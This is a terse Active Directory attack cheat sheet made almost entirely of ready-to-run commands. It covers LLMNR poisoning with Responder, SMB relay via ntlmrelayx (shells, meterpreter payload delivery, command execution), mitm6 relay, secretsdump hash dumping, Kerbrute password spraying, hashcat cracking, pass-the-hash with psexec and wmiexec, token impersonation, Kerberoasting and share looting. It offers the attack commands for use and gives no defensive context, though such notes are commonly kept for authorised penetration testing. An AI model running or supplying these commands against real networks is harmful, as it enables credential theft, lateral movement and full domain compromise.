



## LMNR Poisoning

Responder responder -I eth0 -rdwv

## SMB Relay
`nmap --script=smb2-security-mode.sse -p445`

### Attack 1
http off smb off in responder.conf

```bash
responder -I eth0 -rdwv
ntlmrelayx.py -tf targets.txt -smb2support
```

### Attack 2

http off smb off in responder.conf

```bash
responder -I eth0 -rdwv
ntlmrelayx.py -tf targets.txt -smb2support -i # It will show SMB shell opned on port {PORT}
nc 127.0.0.1 {PORT}
```

SHELL command `shares` to get shares name and `use SHARENAME$` to get access.

### Attack 3

http off smb off in responder.conf

```bash
responder -I eth0 -rdwv
ntlmrelayx.py -tf targets.txt -smb2support -e meterpreterShell.exe
```

### Attack 3

http off smb off in responder.conf

```bash
responder -I eth0 -rdwv
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

## IPV6 mitm6 Attack

`ntlmrelayx.py -6 -t ldaps://192.168.111 -wh sub.domain.tld -l loots`


## Impacket

### secretdump

`secretsdump.py domain/user:password@192.168.0.101  #dump hash`


## Kerbrute

Repo: https://github.com/ropnop/kerbrute

Notes: https://www.hackingarticles.in/a-detailed-guide-on-kerbrute/

```bash
kerbrute userenum --dc 192.168.1.19 -d domain.tld users.txt #userenum
kerbrute passwordspray --dc 192.168.1.19 -d domain.tld users.txt Password@1 #user bruteforce with known password
kerbrute bruteuser --dc 192.168.1.19 -d domain.tld password.txt admin #password bruteforce with known username
```

## Hashcrack

### NTLMHash

hashcat -m 5600 hash.txt rockyout.txt -O

### Samhash

hashcat -m 1000 hash.txt rockyout.txt -O

# Attacks with Credential

### Metasploit PSEXEC

use exploit `exploit/windows/smb/psexec` on metasploit

or

`psexec.py domain.tld/username:password@192.168.0.111`

or

`smbexec.py domain.tld/username:password@192.168.0.111`

or

`wmiexec.py domain.tld/username:password@192.168.0.111`

Command to dump hash after shell in metasploit `hashdump`

`psexec.py username:@192.168.0.111 -hashes fullhashfirstpart:fullhashanotherpart #Login with dump`

# Attacks After Compromise

## PowerView

https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1

```powershell
powershell -ep bypass 
..\PowerView.ps1
```

```Powershell
Get-NetDomain  # DC info
Get-NetDomainController # DC Info
Get-NetDomainPolicy  # Domain Policy
Get-NetDomainPolicy.{system access} # Specific Policy By Name
Get-NetUser # User Details
Get-UserProperty #user property names
Get-UserProperty -Properties propertyname #specific property
Get-NetComputer -FullData
Get-NetGroup # Get Group Names
Get-NetGroupMember -GroupName "Domain Admin" # Get Group Mamber Names of Specific Group
Invoke-ShareFinder # Share Details

```

## BloodHound

Bloodhound old popular repo https://github.com/BloodHoundAD/BloodHound

Latest Bloodhound version https://github.com/SpecterOps/BloodHound

```bash
neo4j console #neo4j login
bloodhound #bloodhound start in new terminal tab
```

Sharphound Data Collection for bloodhound https://github.com/BloodHoundAD/SharpHound3

```Powershell
powershell -ep bypass 
..\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain domain.tld -ZipFileName output.zip
```

Upload Zip in BloodHound

Goto Queries and Select Queries

## NetExec

New version of Crackmapexec 

Repo: https://github.com/Pennyw0rth/NetExec

Old version: https://github.com/byt3bl33d3r/CrackMapExec

Old Cheetsheet: https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/

```bash
# in case of crackmapexec command is cme and for netexec it is nxc. Arguments are same.
nxc smb 10.10.3.0/24 -u username -D Domain.tld -p password # Find login with password
nxc smb 10.10.3.0/24 -u username -H hashdumpedhashlastpart --local # Find login with hash
nxc smb 10.10.3.0/24 -u "FirestName LastName" -H hashdumpedhashlastpart --local-auth # Find login with hash
```

## Token Impersonation

Connect with metasploit psexec `exploit/windows/smb/psexec` using `windows/x64/meterpreter/reverse_tcp` payload.

```bash
meterpreter> load incognito 
meterpreter> list_tokens -u # listing tokens
meterpreter> impersonate_token USERNAME\\Administrator
meterpreter> shell #now you can use shell as USERNAME\\Administrator
meterpreter> rev2self # to reverse impersonationation process, not important command
```

## Kerberoasting

Get Login Token with `GetUserSPNs.py domain.tld/username:password -dc-ip 192.158.0.101 -request`

hashcat `hashcat -m13100 hash.txt rockyout.txt -o`

## mimikatz

Wiki: https://github.com/gentilkiwi/mimikatz/wiki

# Common Checks

## smbclient

`smbclient -L \\\\10.10.10.101\\ # Check if anonymous user enabled`

`smbclient -L \\\\10.10.10.101\\username # login as particualr user`

smb command download everything `smb: > mget *`




